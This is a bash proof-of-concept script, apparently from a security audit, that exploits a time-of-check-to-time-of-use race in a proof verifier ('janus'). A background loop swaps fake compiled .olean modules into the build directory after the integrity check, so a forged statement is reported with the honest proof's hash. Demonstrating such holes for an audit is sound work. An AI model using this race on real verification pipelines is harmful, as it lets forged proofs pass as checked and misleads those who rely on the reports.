#!/usr/bin/env bash
# ATTACK C2: TOCTOU on .janus-build. Verify the HONEST examples/proofs/Add.lean while a concurrent
# process waits for .janus-build/Audit.lean (written after the proof-compile integrity check) and
# swaps in a precompiled (fake Extracted, fake Proof) .olean pair. Audit and leanchecker then load
# the swapped modules, and the report shows the fake statement with the honest proof's SHA-256.
# Needs audit/work/fakepair/{Extracted,Proof}.olean (built in AUDIT.md, step C2).
set -u
root=/srv/janus; out=$root/audit/work/Add; b=$out/.janus-build
( while [ -e "$b" ]; do :; done   # wait for verify to wipe the old build dir
  for i in $(seq 1 2000000); do
    if [ -f "$b/Audit.lean" ]; then cp $root/audit/work/fakepair/Extracted.olean $root/audit/work/fakepair/Proof.olean "$b/"; echo "[watcher] swapped"; exit 0; fi
  done ) &
w=$!
"${JANUS_BIN:-$root/audit/bin/janus}" verify --janus-root "$root" --proof "$root/examples/proofs/Add.lean" "$out"
wait $w
